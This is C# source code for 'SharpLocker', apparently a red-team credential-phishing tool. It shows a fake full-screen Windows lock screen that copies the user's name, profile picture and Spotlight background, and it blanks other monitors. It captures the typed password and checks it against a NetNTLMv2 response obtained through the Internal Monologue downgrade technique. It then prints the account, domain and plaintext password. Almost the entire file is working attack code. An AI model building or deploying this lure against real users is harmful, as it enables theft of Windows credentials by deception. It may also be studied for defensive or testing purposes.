using InternalMonologue;
using NetNTLMv2Checker;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace SharpLocker
{
    public partial class LockScreenForm : Form
    {
        private static string welcome = @" 

 $$$$$$\  $$\                                     $$\                          $$\                           
$$  __$$\ $$ |                                    $$ |                         $$ |                          
$$ /  \__|$$$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\  $$ |      $$$$$$\   $$$$$$$\ $$ |  $$\  $$$$$$\   $$$$$$\  
\$$$$$$\  $$  __$$\  \____$$\ $$  __$$\ $$  __$$\ $$ |     $$  __$$\ $$  _____|$$ | $$  |$$  __$$\ $$  __$$\ 
 \____$$\ $$ |  $$ | $$$$$$$ |$$ |  \__|$$ /  $$ |$$ |     $$ /  $$ |$$ /      $$$$$$  / $$$$$$$$ |$$ |  \__|
$$\   $$ |$$ |  $$ |$$  __$$ |$$ |      $$ |  $$ |$$ |     $$ |  $$ |$$ |      $$  _$$<  $$   ____|$$ |      
\$$$$$$  |$$ |  $$ |\$$$$$$$ |$$ |      $$$$$$$  |$$$$$$$$\\$$$$$$  |\$$$$$$$\ $$ | \$$\ \$$$$$$$\ $$ |      
 \______/ \__|  \__| \_______|\__|      $$  ____/ \________|\______/  \_______|\__|  \__| \_______|\__|      
                                        $$ |                                                                 
                                        $$ |                                                                 
                                        \__|                                                                

";
        [DllImport("shell32.dll", EntryPoint = "#261",
        CharSet = CharSet.Unicode, PreserveSig = false)]
        public static extern void GetUserTilePath(
        string username,
        uint whatever, // 0x80000000
        StringBuilder picpath, int maxLength);

        public static string GetUserTilePath(string username)
        {   // username: use null for current user
            var sb = new StringBuilder(1000);
            GetUserTilePath(username, 0x80000000, sb, sb.Capacity);
            return sb.ToString();
        }

        public static Image GetUserTile(string username)
        {
            return Image.FromFile(GetUserTilePath(username));
        }
        public LockScreenForm()
        {
            InitializeComponent();
            Taskbar.Hide();
            Console.WriteLine(welcome);
            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Normal;
            StartPosition = FormStartPosition.Manual;
            Location = new Point(0, 0);
            Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

            Image myimage = new Bitmap(getSpotlightImage());
            BackgroundImage = myimage;

            BackgroundImageLayout = ImageLayout.Stretch;
            TopMost = true;

            string userName = Environment.UserName;
            UserNameLabel.Text = userName;
            UserNameLabel.BackColor = Color.Transparent;

            int usernameloch = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 64;
            int usericonh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 29;
            int buttonh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 64;
            int usernameh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 50;
            int locked = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 57;

            if (!PasswordTextBox.Focus())
            {
                PasswordTextBox.Focus();
            }

            ActiveControl = PasswordTextBox;

            if (CanFocus)
            {
                Focus();
            }

            PasswordTextBox.Top = usernameloch;
            PasswordTextBox.UseSystemPasswordChar = true;
            ProfileIcon.Top = usericonh;
            SubmitPasswordButton.Top = buttonh;
            UserNameLabel.Top = usernameh;
            LockedLabel.Top = locked;
                        
            foreach (var screen in Screen.AllScreens)
            {
                Thread thread = new Thread(() => WorkThreadFunction(screen));
                thread.Start();
            }
        }

        public string getSpotlightImage()
        {
            //Get Windows Spotlight Images Location Path. (C:\Users\[Username]\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets\)
            string spotlight_dir_path = @Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets\");

            /* Save the name of the larger image from spotlight dir.
             * Normally the larger image present in this directory is the current lock screen image. */
            string img_name = "";
            DirectoryInfo folderInfo = new DirectoryInfo(spotlight_dir_path);
            long largestSize = 0;
            foreach (var fi in folderInfo.GetFiles())
            {
                // log errors
                Taskbar.Show();
                Application.Exit();

                if (fi.Length > largestSize)
                {
                    largestSize = fi.Length;
                    img_name = fi.Name;
                }
            }
            //Save image full path
            string img_path = Path.Combine(spotlight_dir_path, img_name);
            return img_path;
        }
        public void WorkThreadFunction(Screen screen)
        {
            try
            {
                if (screen.Primary == false)
                {
                    int mostLeft = screen.WorkingArea.Left;
                    int mostTop = screen.WorkingArea.Top;
                    Debug.WriteLine(mostLeft.ToString(), mostTop.ToString());
                    using (Form form = new Form())
                    {
                        form.WindowState = FormWindowState.Normal;
                        form.StartPosition = FormStartPosition.Manual;
                        form.Location = new Point(mostLeft, mostTop);
                        form.FormBorderStyle = FormBorderStyle.None;
                        form.Size = new Size(screen.Bounds.Width, screen.Bounds.Height);
                        form.BackColor = Color.Black;
                        form.ShowDialog();
                    }
                }
            }
            catch (Exception ex)
            {
                // log errors
            }
        }

        protected override CreateParams CreateParams
        {
            get
            {
                var parms = base.CreateParams;
                parms.Style &= ~0x02000000;  // Turn off WS_CLIPCHILDREN
                parms.ExStyle |= 0x02000000;
                return parms;
            }
        }

        protected override void OnClosing(CancelEventArgs e)
        {
            Taskbar.Show();
            base.OnClosing(e);
        }

        private void PasswordTextBox_TextChanged(object sender, EventArgs e)
        {

        }

        private void SubmitPasswordButton_Click(object sender, EventArgs e)
        {
            string plainpassword = PasswordTextBox.Text;
            startmonologue(plainpassword);
            Taskbar.Show();
            Application.Exit();

        }

        private void LockScreenForm_Load(object sender, EventArgs e)
        {

        }

        static int tableWidth = 73;

        static void PrintLine()
        {
            Console.WriteLine(new string('-', tableWidth));
        }

        static void PrintRow(params string[] columns)
        {
            int width = (tableWidth - columns.Length) / columns.Length;
            string row = "|";

            foreach (string column in columns)
            {
                row += AlignCentre(column, width) + "|";
            }

            Console.WriteLine(row);
        }

        static string AlignCentre(string text, int width)
        {
            text = text.Length > width ? text.Substring(0, width - 3) + "..." : text;

            if (string.IsNullOrEmpty(text))
            {
                return new string(' ', width);
            }
            else
            {
                return text.PadRight(width - (width - text.Length) / 2).PadLeft(width);
            }
        }

        public string startmonologue(string plainpassword)
        {
            bool impersonate = true, threads = false, downgrade = true, restore = true, verbose = false;
            string challenge = "1122334455667788";
            var monologue = new InternalMonologue(impersonate, threads, downgrade, restore, challenge, verbose);
            Console.WriteLine("[x] Collecting information...");

            var monologueConsole = monologue.Go();
            var netntlmv2 = monologueConsole.Output();
            string netntlmv2str = netntlmv2.ToString();

            string netNTLMv2Response = netntlmv2.Replace("\n", String.Empty); ;
            IMChecker checker = new IMChecker(netNTLMv2Response);

            string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            string domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;

            if (checker.checkPassword(plainpassword))
            {
                Console.WriteLine("[x] Success: Password Acquired");
                Console.WriteLine("");
                PrintLine();
                PrintRow("Account", "Domain", "Password");
                PrintLine();
                PrintRow(userName, domain, plainpassword);
                PrintLine();
            }
            else
            {
                Console.WriteLine("[x] Incorrect password input by user");
                Console.WriteLine("Exiting..");
            }

            return netntlmv2;
        }
    }
    /* Adapted from https://github.com/opdsealey/NetNTLMv2PasswordChecker/blob/master/NetNTLMv2Checker/Program.cs */
    public class IMChecker
    {
        /* Designed to allow for checking a password locally against the output from Internal Monologue (netNTLMv2 Response) */
        public IMChecker(string netNTLMv2Response)
        {
            originalMessage = netNTLMv2Response;
            parseOriginal();
        }



        private void parseOriginal()
        {
            String[] separators = { ":" };
            String[] strlist = originalMessage.Split(separators, 5, StringSplitOptions.RemoveEmptyEntries);

            username = strlist[0];
            target = strlist[1];
            serverChallenge = utils.StringToByteArray(strlist[2]);
            netNtlmv2ResponseOriginal = utils.StringToByteArray(strlist[3]);
            blob = utils.StringToByteArray(strlist[4]);

        }

        public bool checkPassword(string password)
        {
            byte[] ntlmv2ResponseHash = new byte[16];
            ntlmv2ResponseHash = ntlm.getNTLMv2Response(target, username, password, serverChallenge, blob);
            //Console.WriteLine("Response Hash: " + utils.ByteArrayToString(ntlmv2ResponseHash));
            //Console.WriteLine("Original Hash: " + utils.ByteArrayToString(netNtlmv2ResponseOriginal));
            return ntlmv2ResponseHash.SequenceEqual(netNtlmv2ResponseOriginal);
        }

        public string originalMessage { get; set; }
        private string username { get; set; }
        private string target { get; set; }
        private byte[] serverChallenge { get; set; }

        private byte[] blob { get; set; }
        private byte[] netNtlmv2ResponseOriginal { get; set; }
    }
}
